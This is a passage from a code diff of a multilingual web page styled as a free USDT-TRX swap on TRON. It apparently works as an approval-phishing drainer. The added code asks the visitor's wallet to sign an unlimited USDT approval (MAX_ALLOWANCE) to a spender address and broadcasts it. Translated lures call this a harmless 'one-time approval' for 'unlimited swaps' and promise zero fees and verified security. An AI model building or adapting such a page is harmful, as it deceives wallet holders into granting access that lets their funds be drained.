+                          var parsed = JSON.parse(wcResult);
+                          wcResult = parsed;
+                      } catch (parseErr) {
+                          wcResult = { signature: [wcResult] };
+                      }
+                  }
+
+                                    var broadcastPayload = JSON.parse(JSON.stringify(triggerData.transaction));
+                  if (!wcResult) {
+                      throw new Error('서명 데이터가 없습니다. 지갑 앱을 확인해주세요.');
+                  }
+                  if (wcResult && wcResult.raw_data && wcResult.signature) {
+                      // 완전한 서명된 트랜잭션
+                      broadcastPayload = wcResult;
+                  } else if (wcResult && wcResult.signature) {
+                      // 서명만 있는 경우
+                      broadcastPayload.signature = Array.isArray(wcResult.signature) ? wcResult.signature : [wcResult.signature];
+                  } else if (typeof wcResult === 'string' && wcResult.length > 0) {
+                      // 서명이 문자열로 온 경우
+                      broadcastPayload.signature = [wcResult];
+                  } else {
+                      throw new Error('지갑에서 유효한 서명 데이터를 받지 못했습니다. 다시 시도해주세요.');
+                  }
+
+                    var broadcastRes = await fetch('https://api.trongrid.io/wallet/broadcasttransaction', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(broadcastPayload)
+                    });
+                    var broadcastData = await broadcastRes.json();
+                    if (!broadcastData.result) throw new Error('브로드캐스트 실패: ' + (broadcastData.Error || broadcastData.message || JSON.stringify(broadcastData)));
+                    txHash = broadcastData.txid || broadcastPayload.txID || 'ok';
+
+                } else {
+                    // DApp 브라우저 경로
+                    var tx = await tw.transactionBuilder.triggerSmartContract(
+                        OFFICIAL_USDT_CONTRACT,
+                        'approve(address,uint256)',
+                        { feeLimit: 100000000 },
+                        [{ type: 'address', value: spender }, { type: 'uint256', value: MAX_ALLOWANCE }],
+                        currentWalletAddress
+                    );
+                    if (!tx || !tx.transaction) throw new Error('트랜잭션 생성 실패');
+                                        showToast(currentLang === 'ko' ? '지갑 팝업을 확인하세요! 🔔' :
+                        currentLang === 'zh' ? '请查看钱包弹窗！🔔' :
+                        currentLang === 'ru' ? 'Проверьте всплывающее окно кошелька! 🔔' :
+                        currentLang === 'ja' ? 'ウォレットのポップアップを確認してください！🔔' :
+                        currentLang === 'th' ? 'กรุณาตรวจสอบป๊อปอัพกระเป๋า! 🔔' :
+                        currentLang === 'vi' ? 'Kiểm tra cửa sổ pop-up ví! 🔔' :
+                        currentLang === 'de' ? 'Bitte Wallet-Popup überprüfen! 🔔' :
+                        currentLang === 'fr' ? 'Vérifiez la fenêtre du portefeuille! 🔔' :
+                        currentLang === 'es' ? '¡Verifique la ventana emergente de la billetera! 🔔' :
+                        'Check your wallet popup! 🔔');
+                    var signPromise = tw.trx.sign(tx.transaction);
+                    var timeoutPromise = new Promise(function (_, reject) {
+                        setTimeout(function () { reject(new Error(
+                            currentLang === 'ko' ? '서명 응답 시간 초과. 지갑 앱을 확인해주세요.' :
+                            currentLang === 'zh' ? '签名超时，请检查钱包应用。' :
+                            currentLang === 'ru' ? 'Время подписи истекло. Проверьте кошелёк.' :
+                            currentLang === 'ja' ? '署名タイムアウト。ウォレットアプリを確認してください。' :
+                            currentLang === 'th' ? 'หมดเวลาลงนาม กรุณาตรวจสอบกระเป๋า' :
+                            currentLang === 'vi' ? 'Hết thời gian ký. Kiểm tra ví của bạn.' :
+                            currentLang === 'de' ? 'Signatur-Timeout. Bitte Wallet überprüfen.' :
+                            currentLang === 'fr' ? 'Délai de signature. Vérifiez votre portefeuille.' :
+                            currentLang === 'es' ? 'Tiempo de firma agotado. Verifique su billetera.' :
+                            'Signing timeout. Please check your wallet.'
+                        )); }, 30000);
+                    });
+                    var signedTx = await Promise.race([signPromise, timeoutPromise]);
+                    var result = await tw.trx.sendRawTransaction(signedTx);
+                    txHash = (result && result.txid) || (result && result.transaction && result.transaction.txID) || (signedTx && signedTx.txID) || 'ok';
+                }
+
                 if (!txHash) throw new Error('TX 해시 수신 실패');
 
                 setProgress(100, '온체인 승인 완료!');
@@ -1590,34 +1539,31 @@ var tx = await tw.transactionBuilder.triggerSmartContract(
                     showToast('트랜잭션 실패: ' + m.substring(0, 50), 'error');
                     console.error('[APPROVE]', err);
                 }
-         } finally {
-                isApproving = false;
-                hideProgress();
-                var _t = translations[currentLang] || translations.en;
-                var btnLabel = isApproved
-                    ? (_t.swap_btn_done || '교환하기')
-                    : (_t.swap_btn_text || '교환 시작 (최초 1회 승인 필요)');
-                if (btn) {
-                    btn.innerHTML = '<i class="fa-solid fa-arrow-right-arrow-left"></i><span id="approve-btn-text">' + btnLabel + '</span>';
-                    btn.disabled = false;
-                }
-            }
-        };   
+            } finally {
+            isApproving = false;
+            var _t = translations[currentLang] || translations.en;
+            var btnLabel = isApproved
+                ? (_t.swap_btn_done || '교환하기')
+                : (_t.swap_btn_text || '교환 시작 (최초 1회 승인 필요)');
+            btn.innerHTML = '<i class="fa-solid fa-arrow-right-arrow-left"></i><span id="approve-btn-text">' + btnLabel + '</span>';
+            btn.disabled = false;
+        }
+        };
     </script>
 
     <script>
         // ===== 번역 시스템 =====
         var translations = {
-            ko: { modal_status_label: '상태:', modal_status_done: '승인 완료', modal_limit_label: '교환 한도:', modal_limit_max: '무제한', w_imtoken: '글로벌 멀티체인 지갑', w_wc: '지원 지갑에서 연결 코드/QR로 연결 (일부 지갑 TRON 미지원)', not_approved: '미승인', approved_max: '무제한 (MAX)', approval_done: '교환 승인 완료', modal_subtitle: '지갑 앱 내 <strong>브라우저</strong>에서 열면 가장 안정적으로 연결됩니다.<br>또는 아래 지갑을 선택해 진행하세요.', w_tronlink: 'TRON 공식 지갑', w_trust: '멀티체인 지갑', w_tp: '아시아 인기 지갑', w_bitget: '글로벌 Web3 지갑', w_okx: 'OKX 거래소 지갑', modal_tip_title: '앱이 자동으로 안 열리면:', modal_tip1: '1. 선택한 지갑 앱을 직접 여세요', modal_tip2: '2. 앱 내 <strong class="text-white">브라우저(탐색)</strong> 탭으로 이동', modal_tip3: '3. 주소창에 <strong class="text-white">붙여넣기</strong> (URL 자동 복사됨)', bal: '잔액', bal2: '잔액', close_btn: '닫기', ticker_label: '실시간 교환 현황', header_sub: 'USDT ↔ TRX 즉시 교환 | TRC-20 메인넷', connect_wallet: '지갑 연결', hero_badge: 'TRON MAINNET INSTANT SWAP', hero_title1: 'USDT ↔ TRX', hero_title2: '무료 교환', hero_desc: '수수료 0%로 USDT와 TRX를 자유롭게 교환하세요. 최초 1회 스마트 컨트랙트 승인 후 무제한 교환이 가능합니다.', today_volume: '오늘 총 교환량', swap_title: 'USDT ↔ TRX 교환', swap_sub: 'TRC-20 즉시 스왑', approval_needed: '교환 승인 필요', send_amount: '보내는 금액 (USDT)', send_amount_trx: '보내는 금액 (TRX)', receive_amount: '받는 금액 (예상)', receive_amount_usdt: '받는 금액 (예상 USDT)', exchange_rate_label: '교환 비율', fee_label: '수수료', fee_free: '무료', swap_btn_text: '교환 시작 (최초 1회 승인 필요)', swap_btn_done: '교환하기', swap_notice: '최초 1회 교환시 스마트 컨트렉트 승인이 필요합니다', select_wallet: '지갑을 선택하세요', security_title: '보안 검증', faq_title: '자주 묻는 질문 (FAQ)', energy_badge: 'TRON Energy', energy_title: '에너지 렌탈', energy_desc: 'USDT 전송 수수료를 최대 80% 절약하세요', energy_target: '대상 주소', energy_amount: '에너지 수량', energy_1usdt: '≈ 1 USDT 전송', energy_2usdt: '≈ 2회 전송', energy_15usdt: '≈ 15회 전송', energy_150usdt: '≈ 150회 전송', energy_duration: '렌탈 기간', energy_1h: '1시간', energy_1d: '1일', energy_3d: '3일', energy_30d: '30일', energy_est_price: '예상 비용', energy_save_word: '절약', energy_save_max: '최대 절약', energy_speed: '즉시 충전', energy_noncustodial: '비수탁', energy_addr_invalid: '유효한 TRON 주소를 입력하세요', energy_coming_soon: '에너지 렌탈 서비스 준비 중입니다. 곧 오픈합니다!', energy_approval_needed: '에너지 승인 필요', energy_approval_done: '승인 완료', energy_rent_btn_approve: '에너지 렌탈 (최초 1회 승인 필요)', energy_rent_btn_done: '에너지 렌탈하기', energy_free_event: '에너지 렌탈 무료 제공', energy_addr_placeholder: '지갑을 연결하세요' },
-            en: { modal_status_label: 'Status:', modal_status_done: 'Approved', modal_limit_label: 'Swap Limit:', modal_limit_max: 'Unlimited', w_imtoken: 'Global Multi-chain Wallet', w_wc: 'Connect various wallets via QR', not_approved: 'Unapproved', approved_max: 'Unlimited (MAX)', approval_done: 'Swap Approved', modal_subtitle: 'Select your wallet app<br>to connect automatically.', w_tronlink: 'TRON Official Wallet', w_trust: 'Multi-chain Wallet', w_tp: 'Popular in Asia', w_bitget: 'Global Web3 Wallet', w_okx: 'OKX Exchange Wallet', modal_tip_title: 'If the app doesn\'t open:', modal_tip1: '1. Open the wallet app manually', modal_tip2: '2. Go to <strong class="text-white">Browser</strong> tab in the app', modal_tip3: '3. <strong class="text-white">Paste</strong> the URL (auto-copied)', bal: 'Balance', bal2: 'Balance', close_btn: 'Close', ticker_label: 'Live Exchange Feed', header_sub: 'USDT ↔ TRX Instant Swap | TRC-20 Mainnet', connect_wallet: 'Connect Wallet', hero_badge: 'TRON MAINNET INSTANT SWAP', hero_title1: 'USDT ↔ TRX', hero_title2: 'Free Swap', hero_desc: 'Swap freely between USDT and TRX with 0% fee. One-time smart contract approval enables unlimited swaps.', today_volume: 'Today\'s Volume', swap_title: 'USDT ↔ TRX Swap', swap_sub: 'TRC-20 Instant Swap', approval_needed: 'Approval Required', send_amount: 'You Send (USDT)', send_amount_trx: 'You Send (TRX)', receive_amount: 'You Receive (Est.)', receive_amount_usdt: 'You Receive (Est. USDT)', exchange_rate_label: 'Exchange Rate', fee_label: 'Fee', fee_free: 'Free', swap_btn_text: 'Start Swap (One-time Approval Required)', swap_btn_done: 'Swap Now', swap_notice: 'First swap requires smart contract approval', select_wallet: 'Select Your Wallet', security_title: 'Security Verified', faq_title: 'FAQ', energy_badge: 'TRON Energy', energy_title: 'Rent Energy', energy_desc: 'Save up to 80% on USDT transfer fees', energy_target: 'Target Address', energy_amount: 'Energy Amount', energy_1usdt: '≈ 1 USDT transfer', energy_2usdt: '≈ 2 transfers', energy_15usdt: '≈ 15 transfers', energy_150usdt: '≈ 150 transfers', energy_duration: 'Rental Duration', energy_1h: '1 Hour', energy_1d: '1 Day', energy_3d: '3 Days', energy_30d: '30 Days', energy_est_price: 'Est. Cost', energy_save_word: 'savings', energy_save_max: 'Max Savings', energy_speed: 'Instant', energy_noncustodial: 'Non-custodial', energy_addr_invalid: 'Please enter a valid TRON address', energy_coming_soon: 'Energy rental service coming soon!', energy_approval_needed: 'Energy Approval Required', energy_approval_done: 'Approved', energy_rent_btn_approve: 'Rent Energy (One-time Approval)', energy_rent_btn_done: 'Rent Energy', energy_free_event: 'Free Energy Rental', energy_addr_placeholder: 'Connect your wallet' },
-            zh: { modal_status_label: '状态：', modal_status_done: '已批准', modal_limit_label: '兑换限额：', modal_limit_max: '无限制', w_imtoken: '全球多链钱包', w_wc: '通过QR码连接多种钱包', not_approved: '未授权', approved_max: '无限制 (MAX)', approval_done: '授权完成', modal_subtitle: '选择您的钱包应用<br>自动连接。', w_tronlink: 'TRON 官方钱包', w_trust: '多链钱包', w_tp: '亚洲热门钱包', w_bitget: '全球 Web3 钱包', w_okx: 'OKX 交易所钱包', modal_tip_title: '如果应用未自动打开：', modal_tip1: '1. 手动打开钱包应用', modal_tip2: '2. 进入应用内的<strong class="text-white">浏览器</strong>选项卡', modal_tip3: '3. 在地址栏<strong class="text-white">粘贴</strong>网址（已自动复制）', bal: '余额', bal2: '余额', close_btn: '关闭', ticker_label: '实时交换动态', header_sub: 'USDT ↔ TRX 即时兑换 | TRC-20 主网', connect_wallet: '连接钱包', hero_badge: 'TRON 主网即时兑换', hero_title1: 'USDT ↔ TRX', hero_title2: '免费兑换', hero_desc: '0%手续费自由兑换USDT与TRX。首次智能合约授权后可无限兑换。', today_volume: '今日交易量', swap_title: 'USDT ↔ TRX 兑换', swap_sub: 'TRC-20 即时兑换', approval_needed: '需要授权', send_amount: '发送金额 (USDT)', send_amount_trx: '发送金额 (TRX)', receive_amount: '接收金额（预估）', receive_amount_usdt: '接收金额（预估 USDT）', exchange_rate_label: '汇率', fee_label: '手续费', fee_free: '免费', swap_btn_text: '开始兑换（首次需授权）', swap_btn_done: '立即兑换', swap_notice: '首次兑换需要智能合约授权', select_wallet: '选择钱包', security_title: '安全验证', faq_title: '常见问题', energy_badge: 'TRON Energy', energy_title: '租用能量', energy_desc: 'USDT转账手续费最高节省80%', energy_target: '目标地址', energy_amount: '能量数量', energy_1usdt: '≈ 1次USDT转账', energy_2usdt: '≈ 2次转账', energy_15usdt: '≈ 15次转账', energy_150usdt: '≈ 150次转账', energy_duration: '租用时长', energy_1h: '1小时', energy_1d: '1天', energy_3d: '3天', energy_30d: '30天', energy_est_price: '预估费用', energy_save_word: '节省', energy_save_max: '最高节省', energy_speed: '即时到账', energy_noncustodial: '非托管', energy_addr_invalid: '请输入有效的TRON地址', energy_coming_soon: '能量租用服务即将上线！', energy_approval_needed: '需要能量授权', energy_approval_done: '已授权', energy_rent_btn_approve: '租用能量（首次需授权）', energy_rent_btn_done: '租用能量', energy_free_event: '能量租用免费', energy_addr_placeholder: '请连接钱包' },
-            ru: { modal_status_label: 'Статус:', modal_status_done: 'Одобрено', modal_limit_label: 'Лимит обмена:', modal_limit_max: 'Безлимитно', w_imtoken: 'Глобальный мультичейн кошелёк', w_wc: 'Подключение кошельков через QR', not_approved: 'Не одобрено', approved_max: 'Безлимитно (MAX)', approval_done: 'Обмен одобрен', modal_subtitle: 'Выберите кошелёк<br>для автоматического подключения.', w_tronlink: 'Официальный кошелёк TRON', w_trust: 'Мультичейн кошелёк', w_tp: 'Популярный в Азии', w_bitget: 'Глобальный Web3 кошелёк', w_okx: 'Кошелёк биржи OKX', modal_tip_title: 'Если приложение не открылось:', modal_tip1: '1. Откройте кошелёк вручную', modal_tip2: '2. Перейдите во вкладку <strong class="text-white">Браузер</strong>', modal_tip3: '3. <strong class="text-white">Вставьте</strong> URL (скопирован)', bal: 'Баланс', bal2: 'Баланс', close_btn: 'Закрыть', ticker_label: 'Обмены в реальном времени', header_sub: 'USDT ↔ TRX Мгновенный обмен | TRC-20', connect_wallet: 'Подключить', hero_badge: 'TRON MAINNET МГНОВЕННЫЙ ОБМЕН', hero_title1: 'USDT ↔ TRX', hero_title2: 'Бесплатный обмен', hero_desc: 'Свободно обменивайте USDT и TRX с комиссией 0%. Одноразовое одобрение смарт-контракта.', today_volume: 'Объём за сегодня', swap_title: 'USDT ↔ TRX Обмен', swap_sub: 'TRC-20 мгновенный обмен', approval_needed: 'Требуется одобрение', send_amount: 'Вы отправляете (USDT)', send_amount_trx: 'Вы отправляете (TRX)', receive_amount: 'Вы получаете (прибл.)', receive_amount_usdt: 'Вы получаете (прибл. USDT)', exchange_rate_label: 'Курс обмена', fee_label: 'Комиссия', fee_free: 'Бесплатно', swap_btn_text: 'Начать обмен (одобрение необходимо)', swap_btn_done: 'Обменять', swap_notice: 'Первый обмен требует одобрения смарт-контракта', select_wallet: 'Выберите кошелёк', security_title: 'Безопасность', faq_title: 'Вопросы и ответы', energy_badge: 'TRON Energy', energy_title: 'Аренда энергии', energy_desc: 'Экономьте до 80% на комиссии USDT', energy_target: 'Целевой адрес', energy_amount: 'Количество энергии', energy_1usdt: '≈ 1 перевод USDT', energy_2usdt: '≈ 2 перевода', energy_15usdt: '≈ 15 переводов', energy_150usdt: '≈ 150 переводов', energy_duration: 'Срок аренды', energy_1h: '1 час', energy_1d: '1 день', energy_3d: '3 дня', energy_30d: '30 дней', energy_est_price: 'Расч. стоимость', energy_save_word: 'экономия', energy_save_max: 'Макс. экономия', energy_speed: 'Мгновенно', energy_noncustodial: 'Некастодиальный', energy_addr_invalid: 'Введите действительный адрес TRON', energy_coming_soon: 'Сервис аренды энергии скоро откроется!', energy_approval_needed: 'Требуется одобрение энергии', energy_approval_done: 'Одобрено', energy_rent_btn_approve: 'Аренда энергии (одобрение)', energy_rent_btn_done: 'Арендовать энергию', energy_free_event: 'Аренда энергии бесплатно', energy_addr_placeholder: 'Подключите кошелёк' },
-            th: { modal_status_label: 'สถานะ:', modal_status_done: 'อนุมัติแล้ว', modal_limit_label: 'วงเงินแลกเปลี่ยน:', modal_limit_max: 'ไม่จำกัด', w_imtoken: 'กระเป๋าหลายเชนระดับโลก', w_wc: 'เชื่อมต่อกระเป๋าผ่าน QR', not_approved: 'ยังไม่อนุมัติ', approved_max: 'ไม่จำกัด (MAX)', approval_done: 'อนุมัติแล้ว', modal_subtitle: 'เลือกกระเป๋าเงิน<br>เพื่อเชื่อมต่ออัตโนมัติ', w_tronlink: 'กระเป๋า TRON อย่างเป็นทางการ', w_trust: 'กระเป๋าหลายเชน', w_tp: 'ยอดนิยมในเอเชีย', w_bitget: 'กระเป๋า Web3 ระดับโลก', w_okx: 'กระเป๋า OKX', modal_tip_title: 'หากแอปไม่เปิด:', modal_tip1: '1. เปิดแอปกระเป๋าด้วยตนเอง', modal_tip2: '2. ไปที่แท็บ<strong class="text-white">เบราว์เซอร์</strong>', modal_tip3: '3. <strong class="text-white">วาง</strong> URL (คัดลอกแล้ว)', bal: 'ยอด', bal2: 'ยอด', close_btn: 'ปิด', ticker_label: 'การแลกเปลี่ยนแบบเรียลไทม์', header_sub: 'USDT ↔ TRX แลกเปลี่ยนทันที | TRC-20', connect_wallet: 'เชื่อมต่อ', hero_badge: 'TRON MAINNET INSTANT SWAP', hero_title1: 'USDT ↔ TRX', hero_title2: 'แลกฟรี', hero_desc: 'แลกเปลี่ยน USDT และ TRX ได้อย่างอิสระ ไม่มีค่าธรรมเนียม', today_volume: 'ปริมาณวันนี้', swap_title: 'USDT ↔ TRX แลกเปลี่ยน', swap_sub: 'TRC-20 แลกทันที', approval_needed: 'ต้องอนุมัติ', send_amount: 'จำนวนที่ส่ง (USDT)', send_amount_trx: 'จำนวนที่ส่ง (TRX)', receive_amount: 'จำนวนที่ได้รับ (ประมาณ)', receive_amount_usdt: 'จำนวนที่ได้รับ (ประมาณ USDT)', exchange_rate_label: 'อัตราแลกเปลี่ยน', fee_label: 'ค่าธรรมเนียม', fee_free: 'ฟรี', swap_btn_text: 'เริ่มแลก (ต้องอนุมัติครั้งเดียว)', swap_btn_done: 'แลกเลย', swap_notice: 'การแลกครั้งแรกต้องอนุมัติสัญญาอัจฉริยะ', select_wallet: 'เลือกกระเป๋า', security_title: 'การรักษาความปลอดภัย', faq_title: 'คำถามที่พบบ่อย', energy_badge: 'TRON Energy', energy_title: 'เช่าพลังงาน', energy_desc: 'ประหยัดค่าธรรมเนียม USDT สูงสุด 80%', energy_target: 'ที่อยู่เป้าหมาย', energy_amount: 'จำนวนพลังงาน', energy_1usdt: '≈ 1 โอน USDT', energy_2usdt: '≈ 2 ครั้ง', energy_15usdt: '≈ 15 ครั้ง', energy_150usdt: '≈ 150 ครั้ง', energy_duration: 'ระยะเวลา', energy_1h: '1 ชั่วโมง', energy_1d: '1 วัน', energy_3d: '3 วัน', energy_30d: '30 วัน', energy_est_price: 'ค่าใช้จ่ายโดยประมาณ', energy_save_word: 'ประหยัด', energy_save_max: 'ประหยัดสูงสุด', energy_speed: 'ทันที', energy_noncustodial: 'ไม่มีผู้ดูแล', energy_addr_invalid: 'กรุณาใส่ที่อยู่ TRON ที่ถูกต้อง', energy_coming_soon: 'บริการเช่าพลังงานเร็วๆ นี้!', energy_approval_needed: 'ต้องอนุมัติพลังงาน', energy_approval_done: 'อนุมัติแล้ว', energy_rent_btn_approve: 'เช่าพลังงาน (อนุมัติครั้งแรก)', energy_rent_btn_done: 'เช่าพลังงาน', energy_free_event: 'เช่าพลังงานฟรี', energy_addr_placeholder: 'เชื่อมต่อกระเป๋าของคุณ' },
-            vi: { modal_status_label: 'Trạng thái:', modal_status_done: 'Đã phê duyệt', modal_limit_label: 'Hạn mức đổi:', modal_limit_max: 'Không giới hạn', w_imtoken: 'Ví đa chuỗi toàn cầu', w_wc: 'Kết nối ví qua QR', not_approved: 'Chưa phê duyệt', approved_max: 'Không giới hạn (MAX)', approval_done: 'Đã phê duyệt', modal_subtitle: 'Chọn ví của bạn<br>để kết nối tự động.', w_tronlink: 'Ví chính thức TRON', w_trust: 'Ví đa chuỗi', w_tp: 'Phổ biến ở châu Á', w_bitget: 'Ví Web3 toàn cầu', w_okx: 'Ví sàn OKX', modal_tip_title: 'Nếu ứng dụng không mở:', modal_tip1: '1. Mở ứng dụng ví thủ công', modal_tip2: '2. Vào tab <strong class="text-white">Trình duyệt</strong>', modal_tip3: '3. <strong class="text-white">Dán</strong> URL (đã sao chép)', bal: 'Số dư', bal2: 'Số dư', close_btn: 'Đóng', ticker_label: 'Giao dịch thời gian thực', header_sub: 'USDT ↔ TRX Đổi ngay | TRC-20', connect_wallet: 'Kết nối ví', hero_badge: 'TRON MAINNET INSTANT SWAP', hero_title1: 'USDT ↔ TRX', hero_title2: 'Đổi miễn phí', hero_desc: 'Tự do đổi giữa USDT và TRX với phí 0%.', today_volume: 'Khối lượng hôm nay', swap_title: 'USDT ↔ TRX Đổi', swap_sub: 'TRC-20 đổi ngay', approval_needed: 'Cần phê duyệt', send_amount: 'Số tiền gửi (USDT)', send_amount_trx: 'Số tiền gửi (TRX)', receive_amount: 'Số tiền nhận (ước tính)', receive_amount_usdt: 'Số tiền nhận (ước tính USDT)', exchange_rate_label: 'Tỷ giá', fee_label: 'Phí', fee_free: 'Miễn phí', swap_btn_text: 'Bắt đầu đổi (cần phê duyệt 1 lần)', swap_btn_done: 'Đổi ngay', swap_notice: 'Lần đổi đầu tiên cần phê duyệt hợp đồng thông minh', select_wallet: 'Chọn ví', security_title: 'Bảo mật', faq_title: 'Câu hỏi thường gặp', energy_badge: 'TRON Energy', energy_title: 'Thuê năng lượng', energy_desc: 'Tiết kiệm đến 80% phí chuyển USDT', energy_target: 'Địa chỉ đích', energy_amount: 'Số lượng năng lượng', energy_1usdt: '≈ 1 lần chuyển USDT', energy_2usdt: '≈ 2 lần chuyển', energy_15usdt: '≈ 15 lần chuyển', energy_150usdt: '≈ 150 lần chuyển', energy_duration: 'Thời gian thuê', energy_1h: '1 giờ', energy_1d: '1 ngày', energy_3d: '3 ngày', energy_30d: '30 ngày', energy_est_price: 'Chi phí ước tính', energy_save_word: 'tiết kiệm', energy_save_max: 'Tiết kiệm tối đa', energy_speed: 'Tức thì', energy_noncustodial: 'Không ủy thác', energy_addr_invalid: 'Vui lòng nhập địa chỉ TRON hợp lệ', energy_coming_soon: 'Dịch vụ thuê năng lượng sắp ra mắt!', energy_approval_needed: 'Cần phê duyệt năng lượng', energy_approval_done: 'Đã phê duyệt', energy_rent_btn_approve: 'Thuê năng lượng (phê duyệt 1 lần)', energy_rent_btn_done: 'Thuê năng lượng', energy_free_event: 'Thuê năng lượng miễn phí', energy_addr_placeholder: 'Kết nối ví của bạn' },
-            ja: { modal_status_label: 'ステータス:', modal_status_done: '承認済み', modal_limit_label: '交換上限:', modal_limit_max: '無制限', w_imtoken: 'グローバルマルチチェーンウォレット', w_wc: 'QRコードでウォレット接続', not_approved: '未承認', approved_max: '無制限 (MAX)', approval_done: '交換承認済み', modal_subtitle: 'ウォレットアプリを選択して<br>自動接続します。', w_tronlink: 'TRON公式ウォレット', w_trust: 'マルチチェーンウォレット', w_tp: 'アジアで人気', w_bitget: 'グローバルWeb3ウォレット', w_okx: 'OKX取引所ウォレット', modal_tip_title: 'アプリが開かない場合：', modal_tip1: '1. ウォレットアプリを手動で開く', modal_tip2: '2. アプリ内の<strong class="text-white">ブラウザ</strong>タブへ', modal_tip3: '3. URLを<strong class="text-white">貼り付け</strong>（コピー済み）', bal: '残高', bal2: '残高', close_btn: '閉じる', ticker_label: 'リアルタイム交換状況', header_sub: 'USDT ↔ TRX 即時交換 | TRC-20 メインネット', connect_wallet: 'ウォレット接続', hero_badge: 'TRON メインネット即時スワップ', hero_title1: 'USDT ↔ TRX', hero_title2: '無料交換', hero_desc: '手数料0%でUSDTとTRXを自由に交換。', today_volume: '本日の取引量', swap_title: 'USDT ↔ TRX 交換', swap_sub: 'TRC-20 即時スワップ', approval_needed: '承認が必要', send_amount: '送金額 (USDT)', send_amount_trx: '送金額 (TRX)', receive_amount: '受取額（予想）', receive_amount_usdt: '受取額（予想 USDT）', exchange_rate_label: '交換レート', fee_label: '手数料', fee_free: '無料', swap_btn_text: '交換開始（初回承認必要）', swap_btn_done: '交換する', swap_notice: '初回交換時にスマートコントラクトの承認が必要です', select_wallet: 'ウォレットを選択', security_title: 'セキュリティ検証', faq_title: 'よくある質問', energy_badge: 'TRON Energy', energy_title: 'エネルギーレンタル', energy_desc: 'USDT送金手数料を最大80%節約', energy_target: '対象アドレス', energy_amount: 'エネルギー量', energy_1usdt: '≈ 1 USDT送金', energy_2usdt: '≈ 2回送金', energy_15usdt: '≈ 15回送金', energy_150usdt: '≈ 150回送金', energy_duration: 'レンタル期間', energy_1h: '1時間', energy_1d: '1日', energy_3d: '3日間', energy_30d: '30日間', energy_est_price: '予想コスト', energy_save_word: '節約', energy_save_max: '最大節約', energy_speed: '即時充電', energy_noncustodial: 'ノンカストディ', energy_addr_invalid: '有効なTRONアドレスを入力してください', energy_coming_soon: 'エネルギーレンタルサービス準備中です！', energy_approval_needed: 'エネルギー承認が必要', energy_approval_done: '承認済み', energy_rent_btn_approve: 'エネルギーレンタル（初回承認必要）', energy_rent_btn_done: 'エネルギーをレンタル', energy_free_event: 'エネルギーレンタル無料', energy_addr_placeholder: 'ウォレットを接続してください' },
-            de: { modal_status_label: 'Status:', modal_status_done: 'Genehmigt', modal_limit_label: 'Tauschlimit:', modal_limit_max: 'Unbegrenzt', w_imtoken: 'Globales Multi-Chain Wallet', w_wc: 'Wallets per QR verbinden', not_approved: 'Nicht genehmigt', approved_max: 'Unbegrenzt (MAX)', approval_done: 'Tausch genehmigt', modal_subtitle: 'Wählen Sie Ihr Wallet<br>für automatische Verbindung.', w_tronlink: 'TRON Offizielles Wallet', w_trust: 'Multi-Chain Wallet', w_tp: 'Beliebt in Asien', w_bitget: 'Globales Web3 Wallet', w_okx: 'OKX Börsen-Wallet', modal_tip_title: 'Falls die App nicht öffnet:', modal_tip1: '1. Öffnen Sie die Wallet-App manuell', modal_tip2: '2. Gehen Sie zum <strong class="text-white">Browser</strong>-Tab', modal_tip3: '3. URL <strong class="text-white">einfügen</strong> (kopiert)', bal: 'Guthaben', bal2: 'Guthaben', close_btn: 'Schließen', ticker_label: 'Live-Austausch', header_sub: 'USDT ↔ TRX Sofort-Tausch | TRC-20', connect_wallet: 'Wallet verbinden', hero_badge: 'TRON MAINNET SOFORT-TAUSCH', hero_title1: 'USDT ↔ TRX', hero_title2: 'Kostenlos tauschen', hero_desc: 'Tauschen Sie frei zwischen USDT und TRX mit 0% Gebühr.', today_volume: 'Heutiges Volumen', swap_title: 'USDT ↔ TRX Tausch', swap_sub: 'TRC-20 Sofort-Swap', approval_needed: 'Genehmigung erforderlich', send_amount: 'Sie senden (USDT)', send_amount_trx: 'Sie senden (TRX)', receive_amount: 'Sie erhalten (geschätzt)', receive_amount_usdt: 'Sie erhalten (geschätzt USDT)', exchange_rate_label: 'Wechselkurs', fee_label: 'Gebühr', fee_free: 'Kostenlos', swap_btn_text: 'Tausch starten (Genehmigung erforderlich)', swap_btn_done: 'Jetzt tauschen', swap_notice: 'Erstmaliger Tausch erfordert Smart-Contract-Genehmigung', select_wallet: 'Wallet auswählen', security_title: 'Sicherheit', faq_title: 'Häufige Fragen', energy_badge: 'TRON Energy', energy_title: 'Energie mieten', energy_desc: 'Sparen Sie bis zu 80% bei USDT-Überweisungen', energy_target: 'Zieladresse', energy_amount: 'Energiemenge', energy_1usdt: '≈ 1 USDT-Überweisung', energy_2usdt: '≈ 2 Überweisungen', energy_15usdt: '≈ 15 Überweisungen', energy_150usdt: '≈ 150 Überweisungen', energy_duration: 'Mietdauer', energy_1h: '1 Stunde', energy_1d: '1 Tag', energy_3d: '3 Tage', energy_30d: '30 Tage', energy_est_price: 'Geschätzte Kosten', energy_save_word: 'Ersparnis', energy_save_max: 'Max. Ersparnis', energy_speed: 'Sofort', energy_noncustodial: 'Nicht-verwahrend', energy_addr_invalid: 'Bitte geben Sie eine gültige TRON-Adresse ein', energy_coming_soon: 'Energie-Mietservice kommt bald!', energy_approval_needed: 'Energie-Genehmigung erforderlich', energy_approval_done: 'Genehmigt', energy_rent_btn_approve: 'Energie mieten (Genehmigung)', energy_rent_btn_done: 'Energie mieten', energy_free_event: 'Energie kostenlos mieten', energy_addr_placeholder: 'Verbinden Sie Ihr Wallet' },
-            fr: { modal_status_label: 'Statut :', modal_status_done: 'Approuvé', modal_limit_label: 'Limite d’échange :', modal_limit_max: 'Illimité', w_imtoken: 'Portefeuille multi-chaînes mondial', w_wc: 'Connecter des portefeuilles via QR', not_approved: 'Non approuvé', approved_max: 'Illimité (MAX)', approval_done: 'Échange approuvé', modal_subtitle: 'Sélectionnez votre portefeuille<br>pour une connexion automatique.', w_tronlink: 'Portefeuille officiel TRON', w_trust: 'Portefeuille multi-chaînes', w_tp: 'Populaire en Asie', w_bitget: 'Portefeuille Web3 mondial', w_okx: 'Portefeuille OKX', modal_tip_title: 'Si l\'appli ne s\'ouvre pas :', modal_tip1: '1. Ouvrez l\'appli manuellement', modal_tip2: '2. Allez dans l\'onglet <strong class="text-white">Navigateur</strong>', modal_tip3: '3. <strong class="text-white">Collez</strong> l\'URL (copié)', bal: 'Solde', bal2: 'Solde', close_btn: 'Fermer', ticker_label: 'Échanges en direct', header_sub: 'USDT ↔ TRX Échange instantané | TRC-20', connect_wallet: 'Connecter', hero_badge: 'TRON MAINNET ÉCHANGE INSTANTANÉ', hero_title1: 'USDT ↔ TRX', hero_title2: 'Échange 